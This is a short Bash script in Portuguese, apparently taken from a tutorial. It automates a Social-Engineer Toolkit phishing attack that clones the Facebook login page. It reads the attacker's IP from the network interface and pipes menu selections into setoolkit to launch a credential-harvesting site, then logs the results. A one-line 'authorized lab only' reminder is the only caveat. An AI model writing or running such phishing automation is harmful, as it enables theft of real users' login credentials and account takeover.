#!/bin/bash
# auto_phish.sh - Automação simples do ataque de phishing com SEToolkit (Facebook)
# Uso: sudo ./auto_phish.sh

set -e

INTERFACE="eth0"
URL_TARGET="https://www.facebook.com"
LOG_FILE="phish_$(date +%Y%m%d_%H%M%S).log"

# Obtém IP da interface
KALI_IP=$(ip -4 addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)

if [ -z "$KALI_IP" ]; then
    echo "Erro: não foi possível obter o IP da interface $INTERFACE"
    exit 1
fi

echo "[+] IP do atacante: $KALI_IP"
echo "[+] Iniciando SEToolkit em modo não interativo (simulado)"

# O comando abaixo envia os inputs para o setoolkit (funciona, mas é frágil)
# Alternativa melhor: criar um arquivo de respostas
cat <<EOF | sudo setoolkit 2>&1 | tee $LOG_FILE
1
2
3
2
$KALI_IP
$URL_TARGET
EOF

echo "[+] Ataque finalizado. Log salvo em $LOG_FILE"
echo "[+] Lembre-se: isso é apenas para laboratório autorizado."
```

Dê permissão de execução: chmod +x scripts/auto_phish.sh